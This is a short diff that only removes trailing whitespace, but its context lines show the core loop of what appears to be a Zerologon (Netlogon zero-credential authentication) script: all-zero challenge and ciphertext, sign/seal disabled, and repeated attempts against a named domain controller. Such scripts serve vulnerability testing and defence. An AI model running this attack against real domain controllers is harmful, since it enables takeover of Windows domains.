@@ -28,7 +28,7 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
   plaintext = b'\x00' * 8
   ciphertext = b'\x00' * 8
 
-  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
+  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
   flags = 0x212fffff
 
   # Send challenge and authentication request.
@@ -39,7 +39,7 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
       target_computer + '\x00', ciphertext, flags
     )
 
-    
+
     # It worked!
     assert server_auth['ErrorCode'] == 0
     return rpc_con
@@ -58,9 +58,9 @@ def perform_attack(dc_handle, dc_ip, target_computer):
   # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
   print('Performing authentication attempts...')
   rpc_con = None
-  for attempt in range(0, MAX_ATTEMPTS):  
+  for attempt in range(0, MAX_ATTEMPTS):
     rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
-    
+
     if not rpc_con:
       print('=', end='', flush=True)
     else:
@@ -84,4 +84,3 @@ if __name__ == '__main__':
 
     dc_name = dc_name.rstrip('$')
     perform_attack('\\\\' + dc_name, dc_ip, dc_name)
-
